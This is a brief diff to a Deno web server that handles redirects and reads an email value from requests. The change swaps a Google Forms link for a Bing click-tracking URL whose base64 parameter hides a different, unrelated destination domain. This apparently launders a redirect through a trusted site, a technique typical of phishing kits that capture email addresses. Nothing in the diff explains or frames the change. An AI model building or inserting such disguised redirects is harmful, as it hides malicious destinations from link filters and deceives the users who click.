@@ -4,7 +4,7 @@ Deno.serve({ port: PORT }, async (req) => {
   const url = new URL(req.url);
 
   const redirectBase =
-    "https://docs.google.com/forms/d/1qQorTQgTj_dvc5hHddk0wA2qWx4LFj1eRiGRl98SUZE/preview";
+    "https://www.bing.com/ck/a?!&&p=82b1182da358da9a8ce89787e818ec7e2e11251ce2a224003dd1b978f82a3f9cJmltdHM9MTc4MjM0NTYwMA&ptn=3&ver=2&hsh=4&fclid=080ac139-b0f5-6daa-32cb-d64db12c6c83&u=a1aHR0cHM6Ly8xaGNtLmdwc3RyYWNraW5nLnBlLw";
 
   let email: string | null = null;
 
